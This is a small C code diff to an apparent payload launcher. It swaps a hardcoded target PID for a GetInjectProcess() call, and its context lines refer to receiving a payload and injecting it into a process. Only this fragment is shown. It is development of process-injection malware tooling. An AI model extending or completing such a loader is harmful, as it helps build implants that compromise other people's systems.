@@ -1,4 +1,4 @@
-// cl.exe /MD -DDEBUG -DWIN_X64 launcher.c loader.c /Fo..\..\obj
+// cl.exe /MD -DDEBUG -DWIN_X64 launcher.c loader.c processes.c /Fo..\..\obj\ 
 #include "launcher.h"
 
 #define MAX_RECORDS 6
@@ -443,7 +443,7 @@ int main(int argc, char **argv)
             // If data.size is set, that means we received data
             if (data.size)
             {
-                int PID = 12916; // TODO
+                int PID = GetInjectProcess(); // TODO
                 dprintf("received data size: %zu\n", data.size);
                 dprintf("start of data.memory: %s\n", data.memory);
                 // On successful inject, don't keep asking for the payload
